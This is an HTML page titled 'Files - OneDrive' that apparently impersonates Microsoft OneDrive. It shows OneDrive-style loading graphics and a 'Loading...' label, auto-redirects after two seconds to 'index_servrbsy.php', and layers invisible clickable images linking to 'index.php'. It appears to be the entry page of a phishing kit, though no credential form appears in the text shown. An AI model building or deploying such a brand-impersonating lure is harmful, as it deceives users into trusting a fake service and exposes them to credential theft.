<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Files - OneDrive</title>
<link rel="shortcut icon" href="images/fav_onedrv.ico" />
<meta HTTP-EQUIV="REFRESH" content="2;index_servrbsy.php">
<style type="text/css">
body
{
   background-color: #FFFFFF;
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #E3E842;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:1366px;height:124px;text-align:left;z-index:0;">
<img src="images/ori.png" id="Image1" alt="" align="top" border="0" style="width:1366px;height:124px;"></div>
<div id="bv_Text1" style="margin:0;padding:0;position:absolute;left:665px;top:242px;width:150px;height:16px;text-align:left;z-index:1;">
<font style="font-size:13px" color="#FFFFFF" face="Arial">Loading...</font></div>
<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:316px;height:128px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:2;">
<a href="index.php"><img src="images/klik.png" id="Image3" alt="" align="top" border="0" style="width:316px;height:128px;"></a></div>
<div id="bv_Image4" style="margin:0;padding:0;position:absolute;left:1163px;top:0px;width:179px;height:127px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:3;">
<a href="index.php"><img src="images/klik.png" id="Image4" alt="" align="top" border="0" style="width:179px;height:127px;"></a></div>
<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:301px;top:241px;width:849px;height:265px;text-align:left;z-index:4;">
<img src="images/onedrivload.png" id="Image2" alt="" align="top" border="0" style="width:849px;height:265px;"></div>
</body>
</html>